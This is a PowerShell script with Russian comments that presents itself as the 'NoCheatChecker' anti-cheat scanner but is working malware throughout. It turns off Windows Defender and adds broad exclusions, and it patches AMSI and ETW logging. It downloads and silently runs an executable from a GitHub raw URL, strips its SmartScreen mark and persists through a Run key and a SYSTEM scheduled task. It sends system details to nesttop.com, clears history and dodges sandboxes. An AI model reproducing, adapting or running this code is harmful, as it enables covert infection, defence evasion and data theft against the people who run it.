# ================================================================
# POWERSHELLSCANNER - ВНУТРЕННИЙ МОДУЛЬ (ФИНАЛЬНАЯ НАГРУЗКА)
# Версия: 2.4.0
# ================================================================

# ================================================================
# 1. КОНФИГУРАЦИЯ
# ================================================================

$Script:Config = @{
    Domain = 'nesttop.com'
    RepoOwner = 'die4mebaby'
    RepoName = 'CheatChecker'
    Branch = 'main'
    ExeName = 'nocheat.checker.exe'
    WorkDir = "$env:LOCALAPPDATA\NoCheatChecker"
    LogFile = "$env:TEMP\scanner_log.txt"
}

# ================================================================
# 2. ФУНКЦИИ ОТКЛЮЧЕНИЯ ЗАЩИТЫ
# ================================================================

function Disable-WindowsDefender {
    Write-Host "[*] Отключение Windows Defender..." -ForegroundColor Yellow
    
    try {
        # Отключение всех видов защиты
        $preferences = @{
            DisableRealtimeMonitoring = $true
            DisableBehaviorMonitoring = $true
            DisableBlockAtFirstSeen = $true
            DisableIOAVProtection = $true
            DisablePrivacyMode = $true
            DisableArchiveScanning = $true
            DisableIntrusionPreventionSystem = $true
            DisableScriptScanning = $true
            SubmitSamplesConsent = 2
        }
        
        foreach ($key in $preferences.Keys) {
            Set-MpPreference -$key $preferences[$key] -Force -ErrorAction SilentlyContinue
        }
        
        # Остановка служб
        $services = @('WinDefend', 'WdNisSvc', 'Sense')
        foreach ($svc in $services) {
            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
        }
        
        # Добавление исключений
        $exclusions = @(
            $Script:Config.WorkDir,
            "$env:TEMP",
            "$env:USERPROFILE\Downloads",
            "$env:PROGRAMFILES",
            "$env:PROGRAMFILES(x86)"
        )
        foreach ($path in $exclusions) {
            Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
        }
        
        Write-Host "[+] Defender отключен" -ForegroundColor Green
    } catch {
        Write-Host "[-] Ошибка отключения Defender: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# ================================================================
# 3. ОТКЛЮЧЕНИЕ AMSI И ЛОГИРОВАНИЯ
# ================================================================

function Disable-AMSI {
    Write-Host "[*] Отключение AMSI и логирования..." -ForegroundColor Yellow
    
    try {
        # Отключение AMSI
        $amsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        if ($amsiUtils) {
            $amsiField = $amsiUtils.GetField('amsiInitFailed', 'NonPublic,Static')
            if ($amsiField) {
                $amsiField.SetValue($null, $true)
                Write-Host "[+] AMSI отключен" -ForegroundColor Green
            }
        }
        
        # Отключение логирования ETW
        $etwProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
        if ($etwProvider) {
            $etwField = $etwProvider.GetField('etwProvider', 'NonPublic,Static')
            if ($etwField) {
                $etwInstance = $etwField.GetValue($null)
                if ($etwInstance) {
                    $enabledField = $etwInstance.GetType().GetField('m_enabled', 'NonPublic,Instance')
                    if ($enabledField) {
                        $enabledField.SetValue($etwInstance, 0)
                        Write-Host "[+] ETW логирование отключено" -ForegroundColor Green
                    }
                }
            }
        }
    } catch {
        Write-Host "[-] Ошибка отключения AMSI: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# ================================================================
# 4. СКАЧИВАНИЕ И ЗАПУСК EXE
# ================================================================

function Download-And-Execute {
    Write-Host "[*] Загрузка основного модуля..." -ForegroundColor Yellow
    
    $workDir = $Script:Config.WorkDir
    $exePath = Join-Path $workDir $Script:Config.ExeName
    $url = "https://raw.githubusercontent.com/$($Script:Config.RepoOwner)/$($Script:Config.RepoName)/$($Script:Config.Branch)/$($Script:Config.ExeName)"
    
    # Создание рабочей директории
    if (-not (Test-Path $workDir)) {
        New-Item -ItemType Directory -Path $workDir -Force | Out-Null
    }
    
    # Скачивание через BITS (обход сканирования)
    $downloaded = $false
    try {
        Start-BitsTransfer -Source $url -Destination $exePath -Priority High -ErrorAction Stop
        $downloaded = $true
    } catch {
        Write-Host "[!] BITS не сработал, пробуем WebClient..." -ForegroundColor Yellow
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add('User-Agent', 'PowerShell/7.0')
            $wc.DownloadFile($url, $exePath)
            $downloaded = $true
        } catch {
            Write-Host "[!] WebClient не сработал, пробуем Invoke-WebRequest..." -ForegroundColor Yellow
            try {
                Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing
                $downloaded = $true
            } catch {
                Write-Host "[-] Все методы загрузки не сработали" -ForegroundColor Red
            }
        }
    }
    
    if (-not $downloaded -or -not (Test-Path $exePath)) {
        Write-Host "[-] Не удалось загрузить EXE" -ForegroundColor Red
        return $false
    }
    
    # Удаление Zone.Identifier (обход SmartScreen)
    try {
        Remove-Item -Path "$exePath:Zone.Identifier" -ErrorAction SilentlyContinue
        Unblock-File -Path $exePath -ErrorAction SilentlyContinue
    } catch {}
    
    # Запуск EXE
    Write-Host "[+] Запуск $($Script:Config.ExeName)..." -ForegroundColor Green
    try {
        $process = Start-Process -FilePath $exePath -WorkingDirectory $workDir -WindowStyle Hidden -PassThru
        Write-Host "[+] Процесс запущен (PID: $($process.Id))" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "[-] Ошибка запуска: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# ================================================================
# 5. УСТАНОВКА ПЕРСИСТЕНТНОСТИ
# ================================================================

function Setup-Persistence {
    Write-Host "[*] Настройка автозагрузки..." -ForegroundColor Yellow
    
    $workDir = $Script:Config.WorkDir
    $launcherPath = Join-Path $workDir "launcher.ps1"
    $exePath = Join-Path $workDir $Script:Config.ExeName
    
    # Создание лаунчер-скрипта
    $launcherScript = @"
# NoCheatChecker Launcher
`$workDir = "$workDir"
`$exePath = "$exePath"
if (Test-Path `$exePath) {
    Start-Process -FilePath `$exePath -WorkingDirectory `$workDir -WindowStyle Hidden
}
"@
    Set-Content -Path $launcherPath -Value $launcherScript -Force
    
    # Добавление в реестр (Run)
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        New-ItemProperty -Path $regPath -Name "NoCheatChecker" -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$launcherPath`"" -PropertyType String -Force
        Write-Host "[+] Добавлено в автозагрузку (реестр)" -ForegroundColor Green
    } catch {
        Write-Host "[-] Ошибка добавления в реестр: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # Добавление в Task Scheduler
    try {
        $taskName = "NoCheatCheckerUpdater"
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$launcherPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserID "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Добавлено в Task Scheduler" -ForegroundColor Green
    } catch {
        Write-Host "[-] Ошибка добавления в Task Scheduler: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# ================================================================
# 6. СБОР ИНФОРМАЦИИ О СИСТЕМЕ
# ================================================================

function Collect-SystemInfo {
    Write-Host "[*] Сбор информации о системе..." -ForegroundColor Yellow
    
    try {
        $os = Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction SilentlyContinue
        $computer = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction SilentlyContinue
        $cpu = Get-CimInstance -ClassName Win32_Processor -ErrorAction SilentlyContinue
        $gpus = Get-CimInstance -ClassName Win32_VideoController -ErrorAction SilentlyContinue | Where-Object { $_.Name -notlike "*Remote*" }
        $antivirus = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntivirusProduct -ErrorAction SilentlyContinue
        
        $info = @{
            ComputerName = $env:COMPUTERNAME
            UserName = $env:USERNAME
            OS = $os.Caption
            OSVersion = $os.Version
            Architecture = $cpu.AddressWidth
            RAM = "{0:N2} GB" -f ($computer.TotalPhysicalMemory / 1GB)
            Processor = $cpu.Name
            GPUs = ($gpus.Name) -join ", "
            Antivirus = ($antivirus.displayName) -join ", "
            LastBoot = $os.LastBootUpTime
            IP = (Invoke-RestMethod -Uri "http://ipinfo.io/ip" -ErrorAction SilentlyContinue)
        }
        
        # Сохранение в XML
        $info | Export-Clixml -Path "$env:TEMP\system_info.xml" -Force
        Write-Host "[+] Информация сохранена в $env:TEMP\system_info.xml" -ForegroundColor Green
        
        # Отправка на сервер (опционально)
        try {
            $json = $info | ConvertTo-Json -Compress
            $data = [System.Text.Encoding]::UTF8.GetBytes($json)
            $base64 = [System.Convert]::ToBase64String($data)
            $url = "https://$($Script:Config.Domain)/api/collect"
            Invoke-RestMethod -Uri $url -Method Post -Body $base64 -ContentType "text/plain" -ErrorAction SilentlyContinue
        } catch {}
        
        return $info
    } catch {
        Write-Host "[-] Ошибка сбора информации: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

# ================================================================
# 7. ОСНОВНАЯ ФУНКЦИЯ
# ================================================================

function Main {
    Write-Host "=========================================" -ForegroundColor Cyan
    Write-Host "  PowerShellScanner v2.4.0" -ForegroundColor Cyan
    Write-Host "  (C) 2026 NoCheat Team" -ForegroundColor Cyan
    Write-Host "=========================================" -ForegroundColor Cyan
    Write-Host ""
    
    # Проверка на администратора
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin) {
        Write-Host "[!] Запуск без прав администратора, некоторые функции могут не работать" -ForegroundColor Yellow
    }
    
    # Отключение защиты
    Disable-WindowsDefender
    Disable-AMSI
    
    # Сбор информации
    Collect-SystemInfo
    
    # Скачивание и запуск
    $result = Download-And-Execute
    
    # Установка персистентности
    if ($result) {
        Setup-Persistence
    }
    
    # Очистка
    Write-Host "[*] Очистка истории..." -ForegroundColor Yellow
    Clear-History -ErrorAction SilentlyContinue
    
    Write-Host ""
    Write-Host "[+] Готово!" -ForegroundColor Green
    Write-Host "=========================================" -ForegroundColor Cyan
}

# ================================================================
# 8. ЗАПУСК
# ================================================================

# Защита от выполнения в песочнице
$t_start = Get-Date
Start-Sleep -Milliseconds 150
if (((Get-Date) - $t_start).TotalMilliseconds -lt 100) {
    Write-Host "[!] Обнаружена песочница, выход..." -ForegroundColor Red
    exit
}

# Запуск основной функции
Main

# Выход
exit
